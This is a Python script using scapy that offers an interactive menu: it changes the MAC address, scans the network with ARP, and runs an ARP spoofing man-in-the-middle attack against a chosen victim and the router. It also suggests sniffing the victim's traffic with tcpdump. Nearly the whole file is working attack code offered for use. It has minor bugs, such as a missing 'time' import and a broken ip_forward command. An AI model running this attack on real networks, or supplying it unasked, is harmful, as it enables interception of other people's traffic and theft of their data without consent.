#!/usr/bin/ev python

import scapy.all as scapy
import subprocess
import re
import sys

def banner():
    execfile("logo.py")
    execfile("banner.py")

def arp_spoof_attack(ip_victim, ip_router):
    print(" Start Arp_spoof Attack ..... ")
    count=0
    try:
        while True:
            spoof(ip_victim, ip_router)
            spoof(ip_router, ip_victim)
            if count==4:
                print("\n\t [+] Allow Ip forward on ip4 on  your environtment ")
                subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4//ip_forward"])
                print("\n\t [+] Just Hack listen traffic example: tcpdump -i eth0 -vv | grep 10.0.1.17  ")
            count +=2
            print("\r\t [+] spoof mac victim: "+ip_victim+" ip_router "+ ip_router+" packets ["+str(count)+"]"),
            sys.stdout.flush()
            time.sleep(3)
    except KeyboardInterrupt:
        raw_input("\t [+] Detected CTRL+ C ..... Quitting  press any kay to continue")




def mac_process_chage():
    print(subprocess.call(["ifconfig"]))
    interface= raw_input("Select an interfec by name ")
    mac =get_current_mac(interface)
    mac = raw_input("current mac is "+mac+" type new mac : ")
    changa_mac(interface, mac)

def get_current_mac(interface):
    config = subprocess.check_output(["ifconfig", interface])
    mac_address_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", config)
    if mac_address_result:
        return mac_address_result.group(0)
    else:
        print("[-] could not read MAC Address ")

def changa_mac(interface,newMac):
    print("\n\t[*]change mac address " + interface + " to mac : " + newMac)
    print("\t\t [+]down  interface  " + interface)
    subprocess.call(["ifconfig", interface, "down"])
    print("\t\t [+]Setting new MAC Address .... " + newMac)
    subprocess.call(["ifconfig", interface, "hw", "ether", newMac])
    print("\t\t [+]startup interface " + interface)
    subprocess.call(["ifconfig", interface, "up"])
    print("\t[*] change mac address " + interface + " to mac : " + newMac + "\n")

def network_discover_menu_options():
    option = False
    while not option:
        scann_OP = str(raw_input("Do you want scann your network ? Y/N: "))
        if scann_OP == "Y" or scann_OP == "N":
            option = True
        else:
            print(" Argument "+scann_OP+" Not allowed print Y or N ")
        if str(scann_OP) == "Y":
            ip = raw_input("enter your ip/range")
            scann(ip)


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answred_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answred_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    mac = get_mac_address(spoof_ip)
    #print("\t [+] target_ip:"+target_ip+" spoof_ip:"+spoof_ip+" mac_spoofing : "+mac)
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def show_headers_results(answered_list):
    print("----------------------------------------------------------------------")
    print("IP\t\t\t MAC Address")
    print("----------------------------------------------------------------------")
    for element in answered_list:
        print(element[1].psrc + "\t\t" + element[1].hwsrc);

def show_list(answered_list):
    print(answered_list.show())
    for element in answered_list:
        print("#############################################################################")
        print("\nRequest : \n")
        print(element[0].show())
        print("\nResponse : \n")
        print(element[1].show())
        print("\n\t Most important values : psrc ")
        print(element[1].psrc)
        print("\n\t Most important values : hwsrc ")
        print(element[1].hwsrc)
        print("#############################################################################")
    raw_input("press any key to continue ")

def scann(ip):
    arp_request= scapy.ARP()
    arp_request.pdst=ip
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    boradcast_arp_request=broadcast/arp_request
    answered_list= scapy.srp(boradcast_arp_request, timeout=1, verbose=False)[0]
    show_headers_results(answered_list)
    while True:
        show_packages= raw_input("Do you want to show pacakges? Y/N")
        if show_packages == "Y":
            show_list(answered_list)
            break
        elif show_packages == "N":
            break

def menu_options():
    banner()
    print("\n\tWelcome to  ARP Python Spoofing tool ");
    print("\tplease wait application started ..............\n\n")
    option= False
    while not option:
        print("\t\t#####################################################################")
        print("\t\t## Menu Options ..")
        print("\t\t## \t 1) Change local mac address for interface ")
        print("\t\t## \t 2) Network discover  ")
        print("\t\t## \t 3) ARP Spoof Attack  discover  (Make automatically MITM)")
        print("\t\t## \t 4) Exit Program ")
        print("\t\t#######################################################################")
        choose = str(raw_input("\n\tselect an allowed option : "))
        if choose == "4" :
            option=True
            print("\tExiting........")
        if choose == "1":
            mac_process_chage()
        elif choose == "2":
            network_discover_menu_options()
        elif choose == "3":
            target_ip= raw_input("Enter Target ip (victim) : ")
            router_ip= raw_input("Enter router ip : ")
            arp_spoof_attack(target_ip,router_ip)
        subprocess.call(["clear"])

################################
## Main
###############################

menu_options()
